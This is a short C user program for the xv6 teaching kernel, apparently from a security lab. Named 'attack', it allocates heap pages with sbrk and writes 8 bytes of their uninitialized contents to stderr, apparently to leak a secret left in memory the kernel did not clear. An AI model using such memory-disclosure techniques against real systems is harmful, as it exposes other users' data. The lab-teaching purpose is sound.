#include "kernel/types.h"
#include "kernel/stat.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSIZE 4096
#define PAGES  40

int
main(int argc, char *argv[])
{
  if (argc != 1) {
    printf("Usage: attack\n");
  }
  char *buf = sbrk(PGSIZE * 32);
  buf = buf + 16 * PGSIZE;
  write(2, buf + 32, 8);

  exit(0);
}
